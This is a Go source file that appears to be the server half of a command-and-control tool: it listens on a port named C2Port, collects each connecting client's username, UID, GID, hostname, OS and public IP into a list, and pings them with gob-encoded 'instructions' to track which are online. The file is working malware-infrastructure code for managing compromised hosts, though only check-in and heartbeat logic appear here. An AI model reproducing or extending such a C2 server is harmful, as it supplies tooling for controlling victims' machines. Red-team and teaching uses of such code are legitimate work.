package cmd

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"
	//"reflect"
	"time"

	"github.com/spf13/viper"
)

type Client struct {
	ClientBasicInfo
	Conn     net.Conn
	IsOnline bool
}

type ClientBasicInfo struct {
	Username        string
	UID             string
	GID             string
	OperatingSystem string
	Hostname        string
	PublicIP        string
}

type Instructions struct {
	IsHeartbeat bool
	Message     string
}

type Response struct {
	Message string
}

var (
	C2Port     string = "1302"
	clientList []*Client
)

func (c Client) Instruct(i Instructions) error {
	enc := gob.NewEncoder(c.Conn)
	err := enc.Encode(i)
	if err != nil {
		return err
	}
	return nil
}

func Server() {
	p := viper.GetString("Server.Port")
	if p != "" {
		C2Port = p
	}
	go WebServer()

	ln, err := net.Listen("tcp", ":"+C2Port)
	if err != nil {
		log.Fatalf("Error happened listening on C2 port: %v\n", err)
	}
	log.Printf("Listening on port %v...", C2Port)
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error happened accepting connection: %v\n", err)
		}
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	client, err := getClient(conn)
	if err != nil {
		log.Printf("Error happened receiving OS information: %v\n", err)
	}
	fmt.Printf("Got info from new user:\nUsername: %v\nUID: %v\nGID: %v\nHostname: %v\nOS: %v\n", client.ClientBasicInfo.Username,
		client.ClientBasicInfo.UID, client.ClientBasicInfo.GID, client.ClientBasicInfo.Hostname, client.ClientBasicInfo.OperatingSystem)

	go Heartbeat(*client, conn)
}

func Heartbeat(client Client, conn net.Conn) {
	for {
		inst := Instructions{
			IsHeartbeat: true,
			Message:     "PING",
		}
		client.Instruct(inst)
		log.Printf("Pinging %v...\n", client.ClientBasicInfo.PublicIP)

		resp, err := ServerMessageReceiver(conn)
		if err == nil && resp.Message == "PONG" {
			fmt.Printf("Client %v is online!\n", client.ClientBasicInfo.PublicIP)
			client.IsOnline = true
		} else {
			fmt.Printf("Client %v is offline :(\n", client.ClientBasicInfo.PublicIP)
			client.IsOnline = false
			return
		}

		time.Sleep(time.Second * 10)
	}
}

func ServerMessageReceiver(conn net.Conn) (Response, error) {
	dec := gob.NewDecoder(conn)
	c := new(Response)
	err := dec.Decode(c)
	if err != nil {
		return Response{}, err
	}
	return *c, nil
}

func getClient(conn net.Conn) (*Client, error) {
	dec := gob.NewDecoder(conn)
	basicC := new(ClientBasicInfo)
	err := dec.Decode(&basicC)
	if err != nil {
		bad := Client{}
		return &bad, err
	}
	newC := new(Client)
	newC.ClientBasicInfo = *basicC
	newC.Conn = conn
	newC.IsOnline = true

	// for _, v := range clientList {
	// 	sameClient := reflect.DeepEqual(c, v.ClientInfo)
	// 	if sameClient == true {
	// 		fmt.Println("CLIENT ALREADY PRESENT, SETTING TO ONLINE")
	// 		c.IsOnline = true
	// 		return c, nil
	// 	}
	// }
	//fmt.Println("CLIENT NOT PRESENT, ADDING TO LIST")
	clientList = append(clientList, newC)
	return newC, nil
}
